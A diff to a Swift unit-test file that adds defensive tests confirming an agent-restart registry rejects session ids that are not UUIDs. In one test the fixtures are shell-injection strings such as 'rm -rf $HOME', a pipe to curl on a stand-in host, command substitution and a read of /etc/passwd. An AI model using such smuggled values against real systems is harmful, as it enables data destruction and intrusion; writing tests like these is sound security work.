@@ -90,15 +90,153 @@ final class AgentRestartRegistryTests: XCTestCase {
         let registry = try XCTUnwrap(AgentRestartRegistry.named("phase1"))
         let cmd = registry.resolveCommand(
             terminalType: "claude-code",
-            sessionId: "sess-xyz",
+            sessionId: "cccc1111-2222-3333-4444-555566667777",
             metadata: [:]
         )
-        XCTAssertEqual(cmd, "cc --resume sess-xyz")
+        XCTAssertEqual(cmd, "cc --resume cccc1111-2222-3333-4444-555566667777")
     }
 
     func testNamedUnknownReturnsNilInsteadOfErroring() {
         XCTAssertNil(AgentRestartRegistry.named("phase99"))
         XCTAssertNil(AgentRestartRegistry.named(nil))
+    }
+
+    // MARK: - B1 adversarial — registry rejects non-UUID session ids
+
+    /// Defence-in-depth: the store also rejects these at write time, but the
+    /// registry closure re-validates. Any future in-process writer that
+    /// bypasses the store must not become a command-injection vector.
+    func testRegistryRejectsShellMetacharactersInSessionId() {
+        let registry = AgentRestartRegistry.phase1
+        let payloads = [
+            "fake; rm -rf $HOME",
+            "abc | curl evil.example/x",
+            "abc`whoami`",
+            "abc$(whoami)",
+            "abc && touch /tmp/pwned",
+            "abc > /tmp/out",
+            "abc < /etc/passwd",
+            "abc & sleep 1"
+        ]
+        for payload in payloads {
+            XCTAssertNil(
+                registry.resolveCommand(
+                    terminalType: "claude-code",
+                    sessionId: payload,
+                    metadata: [:]
+                ),
+                "payload '\(payload)' must not synthesise a command"
+            )
+        }
+    }
+
+    func testRegistryRejectsEmbeddedNewlineInSessionId() {
+        let registry = AgentRestartRegistry.phase1
+        // Trimming strips leading/trailing whitespace but `\n` inside the
+        // value is preserved — a newline mid-id would submit the first half
+        // as a command and the remainder as a second line.
+        let uuid = "aaaa1111-2222-3333-4444-555566667777"
+        let withEmbeddedNewline = uuid + "\n rm -rf ~"
+        XCTAssertNil(
+            registry.resolveCommand(
+                terminalType: "claude-code",
+                sessionId: withEmbeddedNewline,
+                metadata: [:]
+            ),
+            "embedded newline must not survive the validator"
+        )
+    }
+
+    func testRegistryRejectsLengthBeyondPlausibleUUID() {
+        let registry = AgentRestartRegistry.phase1
+        // > 128 chars.
+        let huge = String(repeating: "a", count: 200)
+        XCTAssertNil(
+            registry.resolveCommand(
+                terminalType: "claude-code",
+                sessionId: huge,
+                metadata: [:]
+            )
+        )
+    }
+
+    func testRegistryRejectsEmptyAfterTrim() {
+        let registry = AgentRestartRegistry.phase1
+        XCTAssertNil(
+            registry.resolveCommand(
+                terminalType: "claude-code",
+                sessionId: "\n\t   \t\n",
+                metadata: [:]
+            )
+        )
+    }
+
+    func testRegistryRejectsHexTooShortOrTooLong() {
+        let registry = AgentRestartRegistry.phase1
+        // Too short in each segment.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "abc-1111-2222-3333-444455556666",
+            metadata: [:]
+        ))
+        // Too long in the last segment.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "aaaaaaaa-1111-2222-3333-444455556666ff",
+            metadata: [:]
+        ))
+        // Missing a segment.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "aaaaaaaa-1111-2222-3333",
+            metadata: [:]
+        ))
+    }
+
+    func testRegistryRejectsWrongSeparatorsInSessionId() {
+        let registry = AgentRestartRegistry.phase1
+        // Underscores instead of dashes.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "aaaa1111_2222_3333_4444_555566667777",
+            metadata: [:]
+        ))
+        // Space-separated.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "aaaa1111 2222 3333 4444 555566667777",
+            metadata: [:]
+        ))
+        // Dots instead of dashes.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "aaaa1111.2222.3333.4444.555566667777",
+            metadata: [:]
+        ))
+    }
+
+    func testRegistryRejectsNonHexInSessionId() {
+        let registry = AgentRestartRegistry.phase1
+        // Uppercase G is not hex.
+        XCTAssertNil(registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "gggghhhh-1111-2222-3333-444455556666",
+            metadata: [:]
+        ))
+    }
+
+    func testRegistryAcceptsMixedCaseUUID() {
+        let registry = AgentRestartRegistry.phase1
+        let cmd = registry.resolveCommand(
+            terminalType: "claude-code",
+            sessionId: "AaBbCcDd-1111-2222-3333-AABBCCDDEEFF",
+            metadata: [:]
+        )
+        XCTAssertEqual(
+            cmd,
+            "cc --resume AaBbCcDd-1111-2222-3333-AABBCCDDEEFF",
+            "UUID grammar is case-insensitive for hex"
+        )
     }
 
     // MARK: - Custom row (Phase 5 shape preview)
